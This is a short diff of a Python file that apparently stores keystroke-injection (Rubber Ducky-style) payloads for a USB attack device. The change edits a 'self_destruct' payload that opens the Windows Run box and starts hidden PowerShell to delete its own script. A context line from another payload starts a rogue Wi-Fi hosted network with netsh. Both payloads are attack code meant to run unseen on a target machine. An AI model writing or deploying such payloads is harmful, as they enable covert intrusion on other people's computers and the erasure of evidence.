@@ -36,13 +36,14 @@ ENTER
 STRING netsh wlan start hostednetwork
 ENTER
 ''',
-    "self_destruct": '''
+    "self_destruct": r'''
 DELAY 1000
 GUI r
 DELAY 300
-STRING powershell -nop -w hidden -c \"Start-Sleep -s 3; Remove-Item -Path \$MyInvocation.MyCommand.Path -Force\"
+STRING powershell -nop -w hidden -c "Start-Sleep -s 3; Remove-Item -Path $MyInvocation.MyCommand.Path -Force"
 ENTER
 '''
+
 }
 
 def list_payloads():
